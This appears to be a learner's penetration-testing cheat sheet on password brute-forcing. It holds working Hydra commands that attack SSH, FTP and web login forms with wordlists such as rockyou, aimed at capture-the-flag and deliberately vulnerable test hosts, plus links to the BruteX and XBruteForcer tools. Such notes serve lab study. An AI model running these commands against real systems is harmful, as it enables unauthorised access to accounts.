# Hydra

* Hydra for SSH and FTP   
	```
	hydra -l [USER NAME] -p [PASSWORD] [IP ADDRESS] -t [NUMBER OF THREADS] [SSH OR FTP]
	```   

* To use a wordlist of usernames we can use the option `-L` and if you want a wordlist of password instead of just one use the option `-P`.

* I also found this code somewhere while I was researching (didn't really work with me). I'm documenting it here in case I needed to use some other time and it came into handy   
```
hydra -l admin -P /home/kali/mywordlist ignition.htb http-port-form "/admin?form_key=uCAJwNW5TywTQ3U8&login%5Busername%5D=^USER^&login%5Bpassword%5D=^PASS^"

//or this one   

hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f

//or this  

hydra -l admin -P /home/kali/Documents/cloned_reps/SecLists/Passwords/2020-200_most_used_passwords.txt -vV -f -t 5 10.129.157.36 http-post-form "/\\login:j_username=^USER^&j_password=^PASS^:loginError"
```  

	
### BruteX   
* Can be used to bruteforce passwords.
* Check out the code on Github through <a href="https://github.com/1N3/BruteX">this link</a>

### XBruteForcer   
* To bruteforce certain Content management systems. Taken from the official github page "Brute Force Tool 🔓 WordPress , Joomla , DruPal , OpenCart , Magento".
* Check out the github page <a href="https://github.com/Moham3dRiahi/XBruteForcer">here</a> .


<!--@nested-tags:brute_force/hydra-->